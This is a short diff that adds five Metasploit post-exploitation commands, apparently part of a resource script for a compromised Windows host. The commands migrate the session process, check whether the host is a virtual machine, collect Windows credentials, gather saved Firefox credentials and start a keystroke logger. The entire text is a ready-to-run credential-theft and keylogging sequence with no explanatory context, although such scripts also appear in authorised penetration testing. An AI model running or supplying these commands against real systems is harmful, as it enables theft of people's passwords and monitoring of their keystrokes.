@@ -1,0 +1,5 @@
+run post/windows/manage/migrate
+run post/windows/gather/checkvm
+run post/windows/gather/credential_collector
+run post/multi/gather/firefox_creds
+run post/windows/capture/keylog_recorder
